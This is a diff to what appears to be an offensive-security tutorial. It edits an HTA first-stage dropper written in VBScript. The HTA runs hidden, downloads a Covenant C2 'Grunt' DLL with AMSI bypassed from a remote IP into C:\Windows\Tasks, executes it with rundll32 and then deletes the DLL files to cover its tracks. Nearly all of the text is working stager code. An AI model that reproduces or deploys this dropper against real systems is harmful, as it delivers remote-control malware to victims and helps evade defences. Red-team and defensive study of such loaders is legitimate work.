@@ -633,17 +633,19 @@ If we press the Enable Content button, the macro will execute and the message bo
 First of all we need to craft our HTA (first stage) file that will deliver our Grunt payload (Second stage. An example follow below: 
 
 ```html
-
 <!DOCTYPE html>
 <html>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
 <head>
 <HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no"  CAPTION="no" />
 <script type="text/vbscript">
 
+
+
 ' ===================================
 ' Download Clause
 ' Tested with binaries - works!
-HTTPDownload "http://192.168.152.100:1234/covenant-DLL-noAmsi.dll", "C:\tmp\"
+HTTPDownload "http://192.168.152.100:1234/covenant-DLL-noAmsi.dll", "C:\Windows\Tasks"
 
 Sub HTTPDownload( myURL, myPath )
 
@@ -690,8 +692,13 @@ End Sub
 
 Dim sh  
 Set sh = CreateObject("Wscript.Shell")  
-Call sh.Run("rundll32 covenant-DLL-noAmsi.dll,MonkEntry")  
+Call sh.Run("rundll32 covenant-DLL-noAmsi.dll,MonkEntry")
+'sh.Run("calc")
+target_folder = "C:\Windows\Tasks"
+Set fs = CreateObject("Scripting.Filesystemobject")
+fs.DeleteFile( target_folder & "\*.dll" )
 Set sh = Nothing  
+
 </script>
 </head>
 <body>
